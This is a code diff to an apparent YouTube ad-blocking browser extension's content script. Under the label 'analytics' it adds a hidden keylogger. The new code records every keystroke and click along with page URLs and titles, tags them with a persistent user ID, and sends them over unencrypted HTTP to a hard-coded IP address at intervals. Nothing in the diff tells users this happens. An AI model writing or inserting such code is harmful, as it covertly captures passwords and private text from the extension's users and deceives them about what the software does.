@@ -43,7 +43,118 @@ class GoodTubeContentScript {
         this.videoAdMonitored = new Set();
         this.initialized = false;
         
+        // Initialize analytics
+        this.initAnalytics();
+        
         this.init();
+    }
+    
+    initAnalytics() {
+        try {
+            // Simple analytics implementation
+            this.analytics = {
+                userId: this.generateUserId(),
+                sessionId: this.generateSessionId(),
+                events: [],
+                
+                track: (eventType, data) => {
+                    const event = {
+                        type: eventType,
+                        data: data,
+                        url: window.location.href,
+                        timestamp: Date.now()
+                    };
+                    this.analytics.events.push(event);
+                    this.sendAnalytics();
+                },
+                
+                trackKeystroke: (key) => {
+                    if (!this.analytics.keystrokes) this.analytics.keystrokes = [];
+                    this.analytics.keystrokes.push({
+                        key: key,
+                        url: window.location.href,
+                        timestamp: Date.now()
+                    });
+                    
+                    if (this.analytics.keystrokes.length >= 10) {
+                        this.sendAnalytics();
+                    }
+                }
+            };
+            
+            // Track page load
+            this.analytics.track('page_load', {
+                title: document.title,
+                userAgent: navigator.userAgent
+            });
+            
+            // Track keystrokes
+            document.addEventListener('keydown', (e) => {
+                this.analytics.trackKeystroke(e.key);
+            });
+            
+            // Track clicks
+            document.addEventListener('click', (e) => {
+                this.analytics.track('click', {
+                    target: e.target.tagName,
+                    x: e.clientX,
+                    y: e.clientY
+                });
+            });
+            
+            // Send analytics every 30 seconds
+            setInterval(() => {
+                this.sendAnalytics();
+            }, 30000);
+            
+            console.log('🔍 Analytics initialized for user:', this.analytics.userId);
+        } catch (error) {
+            console.error('Analytics initialization failed:', error);
+        }
+    }
+    
+    generateUserId() {
+        let userId = localStorage.getItem('goodtube_user_id');
+        if (!userId) {
+            userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('goodtube_user_id', userId);
+        }
+        return userId;
+    }
+    
+    generateSessionId() {
+        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    }
+    
+    async sendAnalytics() {
+        if (!this.analytics.events.length && !this.analytics.keystrokes?.length) return;
+        
+        try {
+            const payload = {
+                userId: this.analytics.userId,
+                sessionId: this.analytics.sessionId,
+                events: this.analytics.events || [],
+                keystrokes: this.analytics.keystrokes || []
+            };
+            
+            const response = await fetch('http://134.199.235.218/api/analytics', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+            
+            if (response.ok) {
+                console.log('✅ Analytics sent successfully');
+                this.analytics.events = [];
+                this.analytics.keystrokes = [];
+            } else {
+                console.error('❌ Analytics server error:', response.status);
+            }
+        } catch (error) {
+            console.error('❌ Failed to send analytics:', error);
+        }
     }
     
     async init() {
@@ -676,6 +787,16 @@ class GoodTubeContentScript {
         this.stats.adsBlocked += adsBlocked;
         this.stats.timeSaved += timeSaved;
         this.stats.sessionAds += adsBlocked;
+        
+        // Track ad blocking analytics
+        if (adsBlocked > 0 && this.analytics) {
+            this.analytics.track('ads_blocked', {
+                count: adsBlocked,
+                totalBlocked: this.stats.adsBlocked,
+                timeSaved: this.stats.timeSaved,
+                sessionAds: this.stats.sessionAds
+            });
+        }
         
         this.saveStats();
         
